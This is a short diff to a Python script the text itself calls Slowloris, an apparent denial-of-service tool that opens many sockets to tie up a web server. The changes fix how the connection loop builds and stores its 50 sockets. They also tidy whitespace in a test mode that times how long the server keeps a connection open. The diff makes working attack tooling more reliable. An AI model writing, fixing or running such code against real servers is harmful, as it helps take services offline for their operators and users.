@@ -91,7 +91,7 @@ else:
 def doconnections():
 	global failed, packetcount
 
-	sock = []
+	sock = [0 for i in range(50)]
 	working = [0 for i in range(50)]
 
 	while True:
@@ -99,7 +99,7 @@ def doconnections():
 		print("\t\tBuilding sockets.");
 		for i in range(50):
 			if not working[i]:
-				sock.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
+				sock[i] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 				sock[i].settimeout(args.tcpto)
 
 				if args.ssl:
@@ -235,7 +235,7 @@ if args.test:
 		except socket.error:
 			delay = times[i-1]
 			break
-			
+
 	try:
 		if sock.send(b"Connection: Close\r\n\r\n"):
 			print("Okay that's enough time. Slowloris closed the socket.")
